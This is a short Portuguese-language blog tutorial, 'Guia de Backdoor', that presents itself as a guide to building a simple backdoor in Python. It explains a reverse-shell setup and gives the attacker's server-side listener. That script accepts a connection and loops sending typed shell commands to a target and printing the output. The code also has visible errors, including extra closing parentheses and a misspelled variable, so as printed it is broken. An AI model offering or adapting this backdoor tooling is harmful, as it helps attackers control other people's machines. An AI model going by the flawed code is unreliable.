---
title: "Guia de Backdoor"
date: 2024-12-10 14:50:00 -0300
categories: [Guia]
tags: [Backdoor, APT-Técnicas]
---

![imagem](https://i.pinimg.com/736x/ae/f0/c1/aef0c11a232964100d4f5b7780f2b930.jpg)

# um Guia sobre Backdoors

> [!NOTE]
> Conteúdo desse Guia
* Como funciona um Backdoor
* Como fazer um simples Backdoor usando python

# um Backdoor simples em python
Nesse exemplo demonstro um Backdoor que usa uma reverse shell e estabelece uma conexão com o alvo para a maquina
do atacante do ataque, permitindo o atacante enviar comandos e receber outputs(saídas) do alvo.

* O código usa a biblioteca socket pra fazer a comunicação entre os Hosts

# Servidor

```
import socket

#comunicação do servidor
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind('localhost', 8080)) #o ip padrão e localhost, e porta 8080
s.listen(1)

#quando estabelecida a conexão, printa conectado e o addr(ip do cliente)
while True:
    conn, addr = s.accept()
    print(f"[+]Conectado a {addr}")

#o looping que permite o servidor enviar comandos pro cliente e receber 
    while True:
        command = input("Shell > ")
        if command == 'exit':
          conn.send(b'exit')
          conn.close()
          break
        else:
            conn.send(command.encode())
            output = conn.recv(1024))
            print(outut.decode())
```
